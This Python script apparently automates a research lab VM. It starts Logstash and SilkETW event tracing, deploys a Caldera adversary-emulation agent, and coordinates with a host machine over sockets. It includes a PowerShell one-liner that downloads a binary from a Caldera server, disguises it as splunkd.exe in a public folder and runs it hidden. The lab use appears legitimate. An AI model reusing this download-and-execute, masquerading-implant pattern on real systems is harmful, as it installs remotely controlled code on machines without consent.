
#!/usr/bin/env python3

# Importing socket library 
import socket
import time
import sys
import subprocess 
import psutil
import shutil
import os

import datetime
import re

import threading 
import copy

import urllib.request
import zipfile


save_directory = "C:\\Users\\puma-4\\Downloads"

HOST_IP = '128.226.116.18' # P16 (Prof Gunahua's lab) 'JY-Big machine' Host machine IP
PORT = 9999

def main():
    print("start", flush = True)

    #-----------------------------------------------------------------------------------------------------------------------
    # 1. Wait and receive message of <adversary-id>" from Host
    s = socket.socket()     # Now we can create socket object
    PORT = 9900             # Lets choose one port and start listening on that port
    print(f"\n VM-socket is listing on port : {PORT}\n", flush = True)
    s.bind(('', PORT)) # Now we need to bind socket to the above port 
    s.listen(10)    # Now we will put the binded socket listening mode

    message_to_receive = None 
    while True: # We do not know when client will contact; so should be listening continously  
        conn, addr = s.accept()    # Now we can establish connection with client
        message_to_receive = conn.recv(1024).decode()
        conn.close()
        print("\n VM-socket closed the connection\n", flush=True)
        break

    if message_to_receive:
        print(f"\n From Host, received message: {message_to_receive}\n", flush = True )
    else:
        raise ValueError(f"Value-Error with received message: {message_to_receive}")
    s.close()

    adversary_id = message_to_receive

    time.sleep(5)


    # try to resync until it works ! doing 2 times does not work when too big
    resync_attempt_cnt = 0
    while True:
       print(f"resync_attempt_cnt: {resync_attempt_cnt}", flush = True)
       resync_attempt_cnt += 1

       # JY @ 2023-12-19 : Added back in due to not being able to rever with only resync when timegap greater than 1 day
       os.system('w32tm /config /update') # JY @ 2023-11-09
       os.system('net stop w32time && net start w32time')

       # JY @ 2023-12-17
       result = subprocess.run(['w32tm', '/resync', '/force'], stdout = subprocess.PIPE)
       decoded_result = result.stdout.decode('utf-8')
       print(decoded_result, flush = True)
       if "The computer did not resync because the required time change was too big." in decoded_result:
          continue
       if "The command completed successfully." in decoded_result:
          break

       if resync_attempt_cnt == 10:
          print("failed to resync but proceed. this is temporary treatment (called when system time and actual time gap is too big), as dealing with windows resync is such a pain", flush=True)
          break


    #os.system('w32tm /resync /force') # JY @ 2023-10-26: resync for compatiability with caldera-server time.
    #os.system('w32tm /resync /force') # try 2 times 
    time.sleep(5)
    #-----------------------------------------------------------------------------------------------------------------------
    # 2. Start 
    #      (2-1) Logstash
    #      (2-2) SilkService
    #      (2-3) Caldera-Agent on a Admin-Priviledged Powershell -- since need to get PROCESSSTART of splunkd.exe

    # (2-1) Start Logstash .........................................................................................
    print ('Start Logstash', flush=True)
    #PW: all following commands should run on powershell based on new event trace using sliketw->logstash->es
    # LOGSTASH_INDEX should be lower-cased.
    psh = f'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
    logstash_index_cmd= "$env:LOGSTASH_INDEX="+"\"" + adversary_id.lower() +"\"" ""
    logstash_cmd='C:\\Users\\puma-4\Desktop\\logstash-8.10.0\\bin\\logstash -f C:\\Users\puma-4\\Desktop\\logstash-8.10.0\\config\\logstash-sample.conf'
    logstash = f"{logstash_index_cmd} ; {logstash_cmd}"
    print(f"{logstash}", flush = True)

    try :
        # PW: New terminal for logstash to start listning on logstash port e.g.,5444,
        spawned_psh_process_logstash = subprocess.Popen([psh, "-Command", logstash],shell=False, text=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("spawned_psh_process_logstash.pid",spawned_psh_process_logstash.pid, flush = True)
    except:
        raise RuntimeError("Exception while starting 'spawned_psh_process_logstash'", flush = True)

    LOGSTASH_PORT = "5444" # important information that ensures listening
    while True:
       # JY @ 2023-12-18
       logstash_listening_result = subprocess.run([psh, '-Command', 'Get-NetTCPConnection', '-State', 'Listen'], stdout = subprocess.PIPE)
       decoded_logstash_listening_result = logstash_listening_result.stdout.decode('utf-8')
       #print(decoded_logstash_listening_result, flush = True)

       if LOGSTASH_PORT in decoded_logstash_listening_result:
          print(decoded_logstash_listening_result, flush = True)
          break

    time.sleep(10) # just wait for 10 more seconds just in case

    #PW: for logstash wait for few sec till logstash will start listening
    #print("For logstash wait for few sec till logstash will start listening", flush = True)
    #time.sleep(30)   # 30 seconds is not enough when things get slow
    
    # (2-2) Create & Start SilkService .........................................................................................
    
    create_silk_service_cmd = 'sc.exe create SilkService binPath="C:\\Users\\puma-4\\Downloads\\SilkETW_SilkService_v8\\v8\\SilkService\\SilkService.exe" start=demand'     
    try:
        spawned_psh_process_silk_service_create = subprocess.Popen([psh, "-Command", 
                                                                  create_silk_service_cmd], 
                                                                  shell=False, text=True,
                                                                  stdin=subprocess.PIPE,
                                                                  stdout=subprocess.PIPE,
                                                                  stderr=subprocess.PIPE)
        print("spawned_psh_process_silk_service_create.pid",spawned_psh_process_silk_service_create.pid, flush = True)
    except:
        raise RuntimeError("Exception while starting 'spawned_psh_process_silk_service_create'", flush = True)
    time.sleep(15)
    print("Created Silkservice, wait for 15 secs", flush = True)



    #start_silk_service_cmd = f"Start-Service SilkService"
    #try:
    #    spawned_psh_process_silk_service_start = subprocess.Popen([psh, "-Command", 
    #                                                              start_silk_service_cmd], 
    #                                                              shell=False, text=True,
    #                                                              stdin=subprocess.PIPE,
    #                                                              stdout=subprocess.PIPE,
    #                                                              stderr=subprocess.PIPE)
    #    stdout, stderr = spawned_psh_process_silk_service_start.communicate()
    #    print(f"stdout,stderr of spawned_psh_process_silk_service_start.communicate(): {stdout} {stderr}", flush = True)
        #print("spawned_psh_process_silk_service_start.pid",spawned_psh_process_silk_service_start.pid, flush = True)
    #except:
    #    raise RuntimeError("Exception while starting 'spawned_psh_process_silk_service_start'", flush = True)
    #time.sleep(15)
    
    while True:

       # JY @ 2023-12-18
       start_service_result = subprocess.run([psh, '-Command', 'Start-Service', 'SilkService'], stdout = subprocess.PIPE)
       decoded_start_service_result = start_service_result.stdout.decode('utf-8')
       print(decoded_start_service_result, flush = True)

       get_service_result = subprocess.run([psh, '-Command', 'Get-Service', 'SilkService'], stdout = subprocess.PIPE)
       decoded_get_service_result = get_service_result.stdout.decode('utf-8').lower()
       print(decoded_get_service_result, flush = True)

       if "stopped" in decoded_get_service_result:
          continue
       if "running" in decoded_get_service_result:
          break

    print("Started Silkservice, wait for 5 secs", flush = True)
    time.sleep(5)

    # (2-3) Start Caldera Agent (splunkd.exe) on the running Caldera-Server ...........................................
    #     
    #     --> this is based on "new_agent_for_caldera_attack_subgraph.py" from Panther-VM
    #    
    #    After the log-streaming starts (by receiving a trigger from the Host),
    #    start the Caldera-Agent the using subprocess-module (which is confirmed to work).
    #    * IMPORTANT: "Command-Prompt" that runs this python-script has "Administrator Privilege."
    #    > cmd = "$server=\"http://192.168.122.1:8888\";$url=\"$server/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like \"C:\\Users\\Public\\splunkd.exe\"} | stop-process -f;rm -force \"C:\\Users\\Public\\splunkd.exe\" -ea ignore;[io.file]::WriteAllBytes(\"C:\\Users\\Public\\splunkd.exe\",$data) | Out-Null;Start-Process -FilePath C:\\Users\\Public\\splunkd.exe -ArgumentList \"-server $server -group red\" -WindowStyle hidden;"
    #    > subprocess.run(["powershell", "-Command", cmd])
    #    ^ More Details can be found in: 
    #      "Caldera-Agent Deploy Commands OneLiner (Copy and Paste to Python).txt"

    print("Starting Caldera-agent", flush = True)
    cmd = "$server=\"http://192.168.122.1:8888\";$url=\"$server/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like \"C:\\Users\\Public\\splunkd.exe\"} | stop-process -f;rm -force \"C:\\Users\\Public\\splunkd.exe\" -ea ignore;[io.file]::WriteAllBytes(\"C:\\Users\\Public\\splunkd.exe\",$data) | Out-Null;Start-Process -FilePath C:\\Users\\Public\\splunkd.exe -ArgumentList \"-server $server -group red\" -WindowStyle hidden;"
    subprocess.run(["powershell", "-Command", cmd])
    print("Started Caldera-agent", flush = True)
     # As done in Host Machine's main file,
     # Wait 5 sec for caldera agent to get the connection with caldera server.
    #time.sleep(5)
    #print("Waited 5 sec for caldera-agent to get connection with caldera-server", flush = True)
    #-----------------------------------------------------------------------------------------------------------------------
    # 3. Tell Host that caldera-agent got connection withe caldera-server 
    
    print(f'Tell Host that logstash/silk-service/caldera-agent started', flush = True)
    ss = socket.socket()
    SEND_PORT = 1100
    ss.connect((HOST_IP, SEND_PORT))
    meesage_to_send = "started__logstash__silkservice__caldera_agent"
    ss.send(meesage_to_send.encode('utf-8'))
    ss.close()  # CHECK IF NECESSARY

    #-----------------------------------------------------------------------------------------------------------------------
    # 4. Host will then invoke the operation.  
    #    Wait and receive message of "terminate__logstash__silkservice" from Host

    s = socket.socket()     # Now we can create socket object
    PORT = 9900             # Lets choose one port and start listening on that port
    print(f"\n VM-socket is listing on port : {PORT}\n", flush = True)
    s.bind(('', PORT)) # Now we need to bind socket to the above port 
    s.listen(10)    # Now we will put the binded socket listening mode

    message_to_receive = None 
    while True: # We do not know when client will contact; so should be listening continously  
        conn, addr = s.accept()    # Now we can establish connection with client
        message_to_receive = conn.recv(1024).decode()
        conn.close()
        print("\n VM-socket closed the connection\n", flush=True)
        break

    if message_to_receive == "terminate__logstash__silkservice":
        print(f"\n From Host, received message: {message_to_receive}\n", flush = True )
    else:
        raise ValueError(f"Value-Error with received message: {message_to_receive}")
    s.close()

    # ---------------------------------------------------------------------------------------------------------------------
    # Wait after activity is done -- Added by JY @ 2023-12-19    
    post_activity_wait_seconds = 3600

    print(f"\n Now Wait {post_activity_wait_seconds} seconds for SilkETW to stream out after activity\n", flush = True)
    time.sleep(post_activity_wait_seconds)
    print(f"\n Waited {post_activity_wait_seconds} seconds for SilkETW to stream out after activity\n", flush = True)

    #-----------------------------------------------------------------------------------------------------------------------
    # 5. Terminate logstash and silkservice


    stop_silk_service_cmd = f"Stop-Service SilkService"
    try:
        spawned_psh_process_silk_service_stop = subprocess.Popen([psh, "-Command", 
                                                                  stop_silk_service_cmd], 
                                                                  shell=False, text=True,
                                                                  stdin=subprocess.PIPE,
                                                                  stdout=subprocess.PIPE,
                                                                  stderr=subprocess.PIPE)
        print("spawned_psh_process_silk_service_stop.pid",spawned_psh_process_silk_service_stop.pid, flush = True)
        print("\nstopped silk-service", flush = True)
    except:
        raise RuntimeError("Exception while starting 'spawned_psh_process_silk_service_stop'", flush = True)
    time.sleep(3)

    spawned_psh_process_silk_service_stop.terminate()
    print(f"TERMINATED spawned_psh_process_silk_service_stop {spawned_psh_process_silk_service_stop.pid}")
    
    #time.sleep(3)
    #spawned_psh_process_silk_service_start.terminate()
    #print(f"TERMINATED spawned_psh_process_silk_service_start {spawned_psh_process_silk_service_start.pid}")


    time.sleep(3)
    spawned_psh_process_silk_service_create.terminate()
    print(f"TERMINATED spawned_psh_process_silk_service_create {spawned_psh_process_silk_service_create.pid}")


    time.sleep(3)
    spawned_psh_process_logstash.terminate()
    print(f"TERMINATED spawned_psh_process_logstash {spawned_psh_process_logstash.pid}",flush = True)

    time.sleep(3)

    # shutdown fakenet

    return


        

        

        
    # Close connection with client



if __name__ == '__main__':
    main()

